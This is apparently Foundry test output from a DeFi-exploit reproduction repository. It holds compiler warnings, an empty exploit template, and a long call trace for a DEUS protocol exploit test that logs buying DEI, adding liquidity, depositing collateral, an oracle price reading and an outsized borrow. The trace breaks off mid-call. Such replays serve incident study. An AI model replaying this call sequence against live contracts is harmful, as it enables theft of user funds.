Compiling 26 files with Solc 0.8.25
Compiling 25 files with Solc 0.8.10
Solc 0.8.25 finished in 939.91ms
Solc 0.8.10 finished in 963.37ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 384.07ms (308.44µs CPU time)

Ran 1 test for src/test/2022-04/deus_exp.sol:ContractTest
[PASS] testExample() (gas: 1923988)
Logs:
  The USDC I have now: 150000000000000
  The DEI after buying DEI: 1000000000000000000000000
  The USDC after buying DEI: 149000000000000
  The LPToken After adding Liquidity: 927698034221650769
  The DepositToken After depositting LPtoken: 927698034221650769
  The DepositToken After addCollateral: 0
  The USDC I have now: 148034505000000
  The DEI I have after swapping: 9534619016488036874016888
  The price from Oracle: 20824251961275304317088252
  the time now: 1651113560
  The DEI after borrowing: 26781504717700342496493190
  The USDC after paying back: 581923738185
  The DEI after paying back: 14781504717700342496493190

Traces:
  [2020088] ContractTest::testExample()
    ├─ [0] VM::prank(0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE)
    │   └─ ← [Return] 
    ├─ [36132] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::Swapin(0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 150000000000000 [1.5e14])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 150000000000000 [1.5e14])
    │   ├─  emit topic 0: 0x05d0634fe981be85c22e2942a880821b70095d84e152c3ea3c17a4e4250d9d61
    │   │        topic 1: 0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98
    │   │        topic 2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x0000000000000000000000000000000000000000000000000000886c98b76000
    │   └─ ← [Return] true
    ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 150000000000000 [1.5e14]
    ├─ emit log_named_uint(key: "The USDC I have now", val: 150000000000000 [1.5e14])
    ├─ [24639] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::approve(0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [88038] 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1::buyDei(1000000000000 [1e12])
    │   ├─ [8589] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1, 1000000000000 [1e12])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1, value: 1000000000000 [1e12])
    │   │   └─ ← [Return] true
    │   ├─ [2407] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::global_collateral_ratio() [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000c3500
    │   ├─ [8023] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transfer(0xa0F395aD5df1Fceb319e162CCf1Ef6645dE8508f, 800000000000 [8e11])
    │   │   ├─ emit Transfer(from: 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1, to: 0xa0F395aD5df1Fceb319e162CCf1Ef6645dE8508f, value: 800000000000 [8e11])
    │   │   └─ ← [Return] true
    │   ├─ [41175] 0x1B7879F4dB7980E464d6B92FDbf9DaA8F1E55073::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
    │   │   ├─ [33923] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::pool_mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit DEIMinted(param0: 0x1B7879F4dB7980E464d6B92FDbf9DaA8F1E55073, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ emit Buy(: 1000000000000 [1e12])
    │   └─ ← [Stop] 
    ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ emit log_named_uint(key: "The DEI after buying DEI", val: 1000000000000000000000000 [1e24])
    ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 149000000000000 [1.49e14]
    ├─ emit log_named_uint(key: "The USDC after buying DEI", val: 149000000000000 [1.49e14])
    ├─ [24639] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::approve(0xa38cd27185a464914D3046f0AB9d43356B34829D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24642] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::approve(0xa38cd27185a464914D3046f0AB9d43356B34829D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [160302] 0xa38cd27185a464914D3046f0AB9d43356B34829D::addLiquidity(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3, 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75, true, 894048109294000000000000 [8.94e23], 965495000000 [9.654e11], 876167147108120000000000 [8.761e23], 946185100000 [9.461e11], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1651088106 [1.651e9])
    │   ├─ [2951] 0x3fAaB499b519fdC5819e3D7ed0C26111904cbc28::getPair(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3, 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75, true) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000005821573d8f04947952e76d94f3abc6d7b43bf8d0
    │   ├─ [6620] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::getReserves() [staticcall]
    │   │   └─ ← [Return] 9256481726736 [9.256e12], 8539783644100652154386415 [8.539e24], 1651088081 [1.651e9]
    │   ├─ [11048] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, 890739986624306173414879 [8.907e23])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, value: 890739986624306173414879 [8.907e23])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, value: 115792089237316195423570985008687907853269984665640563148717597383606956225056 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [8589] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, 965495000000 [9.654e11])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, value: 965495000000 [9.654e11])
    │   │   └─ ← [Return] true
    │   ├─ [118055] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 10221976726736 [1.022e13]
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 9430523630724958327801294 [9.43e24]
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 927698034221650769 [9.276e17])
    │   │   ├─ emit Sync(: 10221976726736 [1.022e13], : 9430523630724958327801294 [9.43e24])
    │   │   ├─ emit Mint(sender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, amount0: 965495000000 [9.654e11], amount1: 890739986624306173414879 [8.907e23])
    │   │   └─ ← [Return] 927698034221650769 [9.276e17]
    │   └─ ← [Return] 890739986624306173414879 [8.907e23], 965495000000 [9.654e11], 927698034221650769 [9.276e17]
    ├─ [674] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 927698034221650769 [9.276e17]
    ├─ emit log_named_uint(key: "The LPToken After adding Liquidity", val: 927698034221650769 [9.276e17])
    ├─ [24613] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::approve(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [583177] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F::deposit(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, 927698034221650769 [9.276e17])
    │   ├─ [2541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   └─ ← [Return] 343702699815313322339729 [3.437e23]
    │   ├─ [359512] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::getReward(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, [0x888EF71766ca594DED1F0FA3AE64eD2941740A20])
    │   │   ├─ [29772] 0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE::distribute(0x08e43d1Cc71Dfd038584e36496d890Ec2874b340)
    │   │   │   ├─ [2510] 0xC4209c19b183e72A037b2D1Fb11fbe522054A90D::update_period()
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000062609e80
    │   │   │   ├─ [5235] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::left(0x888EF71766ca594DED1F0FA3AE64eD2941740A20) [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000002b14e5fead29493716
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [10752] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::transfer(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, 83895970112828001604 [8.389e19])
    │   │   │   ├─ emit Transfer(from: 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340, to: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, value: 83895970112828001604 [8.389e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit ClaimRewards(param0: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, param1: 0x888EF71766ca594DED1F0FA3AE64eD2941740A20, param2: 83895970112828001604 [8.389e19])
    │   │   ├─ [10140] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 59200076283320407852934046 [5.92e25]
    │   │   ├─ [2567] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::ownerOf(8) [staticcall]
    │   │   │   └─ ← [Return] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F
    │   │   ├─ [12157] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::balanceOfNFT(8) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000dd8c5acaa65fe0b484956
    │   │   └─ ← [Stop] 
    │   ├─ [541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   └─ ← [Return] 343786595785426150341333 [3.437e23]
    │   ├─ [37431] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, 927698034221650769 [9.276e17])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, value: 927698034221650769 [9.276e17])
    │   │   └─ ← [Return] true
    │   ├─ [62641] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::deposit(927698034221650769 [9.276e17], 8)
    │   │   ├─ [33274] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::transferFrom(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340, 927698034221650769 [9.276e17])
    │   │   │   ├─ emit Transfer(from: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, to: 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340, value: 927698034221650769 [9.276e17])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [567] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::ownerOf(8) [staticcall]
    │   │   │   └─ ← [Return] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F
    │   │   ├─ [2140] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 59200076283320407852934046 [5.92e25]
    │   │   ├─ [567] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::ownerOf(8) [staticcall]
    │   │   │   └─ ← [Return] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F
    │   │   ├─ [2157] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::balanceOfNFT(8) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000dd8c5acaa65fe0b484956
    │   │   ├─ [4746] 0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE::emitDeposit(8, 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, 927698034221650769 [9.276e17])
    │   │   │   ├─ emit Deposit(param0: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, param1: 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340, param2: 8, param3: 927698034221650769 [9.276e17])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Deposit(param0: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, param1: 8, param2: 927698034221650769 [9.276e17])
    │   │   └─ ← [Stop] 
    │   ├─ [7190] 0xD82001B651F7fb67Db99C679133F384244e20E79::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 927698034221650769 [9.276e17])
    │   │   ├─ [4512] 0xa4a4cA6A18f3F92615Ac96F7e2eC2d7E746bc73e::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 927698034221650769 [9.276e17]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 927698034221650769 [9.276e17])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit Deposited(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, param2: 927698034221650769 [9.276e17])
    │   └─ ← [Stop] 
    ├─ [674] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [3961] 0xD82001B651F7fb67Db99C679133F384244e20E79::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [3789] 0xa4a4cA6A18f3F92615Ac96F7e2eC2d7E746bc73e::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   ├─ [775] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F::userBalances(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000cdfd8726c9c1351
    │   │   └─ ← [Return] 927698034221650769 [9.276e17]
    │   └─ ← [Return] 927698034221650769 [9.276e17]
    ├─ emit log_named_uint(key: "The DepositToken After depositting LPtoken", val: 927698034221650769 [9.276e17])
    ├─ [24723] 0xD82001B651F7fb67Db99C679133F384244e20E79::approve(0x8D643d954798392403eeA19dB8108f595bB8B730, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [24545] 0xa4a4cA6A18f3F92615Ac96F7e2eC2d7E746bc73e::approve(0x8D643d954798392403eeA19dB8108f595bB8B730, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x8D643d954798392403eeA19dB8108f595bB8B730, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [526702] 0x8D643d954798392403eeA19dB8108f595bB8B730::addCollateral(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 927698034221650769 [9.276e17])
    │   ├─ [270400] → new <unknown>@0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd
    │   │   └─ ← [Return] 1018 bytes of code
    │   ├─ [166308] 0xD82001B651F7fb67Db99C679133F384244e20E79::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd, 927698034221650769 [9.276e17])
    │   │   ├─ [166124] 0xa4a4cA6A18f3F92615Ac96F7e2eC2d7E746bc73e::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd, 927698034221650769 [9.276e17]) [delegatecall]
    │   │   │   ├─ [162360] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F::transferDeposit(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd, 927698034221650769 [9.276e17])
    │   │   │   │   ├─ [541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 343786595785426150341333 [3.437e23]
    │   │   │   │   ├─ [39443] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::getReward(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, [0x888EF71766ca594DED1F0FA3AE64eD2941740A20])
    │   │   │   │   │   ├─ [7272] 0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE::distribute(0x08e43d1Cc71Dfd038584e36496d890Ec2874b340)
    │   │   │   │   │   │   ├─ [510] 0xC4209c19b183e72A037b2D1Fb11fbe522054A90D::update_period()
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000062609e80
    │   │   │   │   │   │   ├─ [1235] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::left(0x888EF71766ca594DED1F0FA3AE64eD2941740A20) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000002b14e5fead29493716
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ emit ClaimRewards(param0: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, param1: 0x888EF71766ca594DED1F0FA3AE64eD2941740A20, param2: 0)
    │   │   │   │   │   ├─ [2140] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::totalSupply() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 59200076283320407852934046 [5.92e25]
    │   │   │   │   │   ├─ [567] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::ownerOf(8) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F
    │   │   │   │   │   ├─ [2157] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::balanceOfNFT(8) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000dd8c5acaa65fe0b484956
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 343786595785426150341333 [3.437e23]
    │   │   │   │   ├─ [541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 343786595785426150341333 [3.437e23]
    │   │   │   │   ├─ [39443] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::getReward(0x26E1A0d851CF28E697870e1b7F053B605C8b060F, [0x888EF71766ca594DED1F0FA3AE64eD2941740A20])
    │   │   │   │   │   ├─ [7272] 0xdC819F5d05a6859D2faCbB4A44E5aB105762dbaE::distribute(0x08e43d1Cc71Dfd038584e36496d890Ec2874b340)
    │   │   │   │   │   │   ├─ [510] 0xC4209c19b183e72A037b2D1Fb11fbe522054A90D::update_period()
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000062609e80
    │   │   │   │   │   │   ├─ [1235] 0x08e43d1Cc71Dfd038584e36496d890Ec2874b340::left(0x888EF71766ca594DED1F0FA3AE64eD2941740A20) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000002b14e5fead29493716
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ emit ClaimRewards(param0: 0x26E1A0d851CF28E697870e1b7F053B605C8b060F, param1: 0x888EF71766ca594DED1F0FA3AE64eD2941740A20, param2: 0)
    │   │   │   │   │   ├─ [2140] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::totalSupply() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 59200076283320407852934046 [5.92e25]
    │   │   │   │   │   ├─ [567] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::ownerOf(8) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F
    │   │   │   │   │   ├─ [2157] 0xcBd8fEa77c2452255f59743f55A3Ea9d83b3c72b::balanceOfNFT(8) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000dd8c5acaa65fe0b484956
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [541] 0x888EF71766ca594DED1F0FA3AE64eD2941740A20::balanceOf(0x26E1A0d851CF28E697870e1b7F053B605C8b060F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 343786595785426150341333 [3.437e23]
    │   │   │   │   ├─ emit TransferDeposit(param0: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd, param3: 927698034221650769 [9.276e17])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x648BfC5b5528A34b4Aa4100016722d2dbA9df4fd, value: 927698034221650769 [9.276e17])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit AddCollateral(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 927698034221650769 [9.276e17])
    │   └─ ← [Stop] 
    ├─ [1961] 0xD82001B651F7fb67Db99C679133F384244e20E79::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [1789] 0xa4a4cA6A18f3F92615Ac96F7e2eC2d7E746bc73e::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   ├─ [775] 0x26E1A0d851CF28E697870e1b7F053B605C8b060F::userBalances(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "The DepositToken After addCollateral", val: 0)
    ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
